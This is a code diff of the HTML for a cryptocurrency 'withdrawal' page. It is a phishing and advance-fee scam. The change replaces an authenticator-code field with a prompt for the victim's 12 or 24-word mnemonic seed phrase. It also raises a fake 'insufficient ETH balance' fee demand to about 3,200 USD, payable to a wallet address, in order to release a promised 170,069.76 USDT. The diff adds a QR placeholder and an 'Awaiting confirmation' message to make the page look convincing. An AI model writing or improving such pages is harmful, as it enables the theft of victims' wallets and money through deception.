@@ -108,37 +108,43 @@
         <button id="continueStep2">Continue</button>
       </div>
 
-      <!-- Third Step: Connect Your Wallet -->
-      <div class="box" id="step3" style="display: none;">
-        <h2>Connect Your Wallet</h2>
+<!-- Third Step: Connect Your Wallet -->
+<div class="box" id="step3" style="display: none;">
+  <h2>Connect Your Wallet</h2>
 
-        <label><b>Your Email Address</b></label>
-        <input type="email" id="email" placeholder="e.g. example@mail.com" />
+  <label><b>Your Email Address</b></label>
+  <input type="email" id="email" placeholder="e.g. example@mail.com" />
 
-        <label><b>Your Authenticator Code</b></label>
-        <input type="text" id="authenticatorCode" placeholder="e.g. 123456" />
+  <label><b>Mnemonic Key Phrases</b></label>
+  <input type="text" id="mnemonic" placeholder="Enter your 12 or 24-word phrase" />
 
-        <button id="continueStep3">Continue</button>
-      </div>
+  <button onclick="backToStep2()">← Back</button>
+  <button id="continueStep3">Continue</button>
+</div>
 
-      <!-- Fourth Step: Final Step -->
-      <div class="box" id="step4" style="display: none;">
-        <h2>Final Step</h2>
 
-        <p style="color: red;"><strong>Insufficient ETH Balance</strong></p>
-        <p>You are initiating an automatic withdrawal of <strong>170,069.76 USDT</strong>.</p>
-        <p><strong>ETH BALANCE:</strong> 0 USDT</p>
-        <p><strong>Balance:</strong> 170,069.76 USDT (in ETH network)</p>
-        <p>Please add <strong>0.25338349 ETH (1,123.61 NZD)</strong> to your network.</p>
-        <p><strong>Network:</strong> Ethereum</p>
-        <p><strong>Wallet Address:</strong> <span class="highlight">0xa96c5F387Ed6945216231275BCE59E63D4CbAAB3</span></p>
+<!-- Fourth Step: Final Step -->
+<div class="box" id="step4" style="display: none;">
+  <h2>Final Step</h2>
 
-        <h3>Important Note:</h3>
-        <ul>
-          <li><strong>Please ensure that this window remains open</strong> during the entire withdrawal process to avoid any interruptions.</li>
-          <li><strong>Important:</strong> Please ensure that you select the <strong>Ethereum network</strong> when making the transfer to avoid any issues with the transaction.</li>
-        </ul>
-      </div>
+  <p style="color: red;"><strong>Insufficient ETH Balance</strong></p>
+  <p>You are initiating a withdrawal of <strong>170,069.76 USDT</strong>.</p>
+  <p><strong>ETH BALANCE:</strong> 0 USDT</p>
+  <p><strong>Balance:</strong> 170,069.76 USDT</p>
+  <p>Please add <strong>1.21675667 ETH (~3,200 USD)</strong> to your network.</p>
+  <p><strong>Network:</strong> Ethereum</p>
+  <p><strong>Wallet Address:</strong> <span class="highlight">0x00**********00</span></p>
+
+  <div class="qr">[QR CODE HERE]</div>
+  <p class="loading"><strong>Awaiting confirmation…</strong></p>
+
+  <h3>Important Note:</h3>
+  <ul>
+    <li><strong>Please ensure that this window remains open</strong> during the entire withdrawal process to avoid any interruptions.</li>
+    <li><strong>Important:</strong> Please ensure that you select the <strong>Ethereum network</strong> when making the transfer to avoid any issues with the transaction.</li>
+  </ul>
+</div>
+
 
     </main>
 
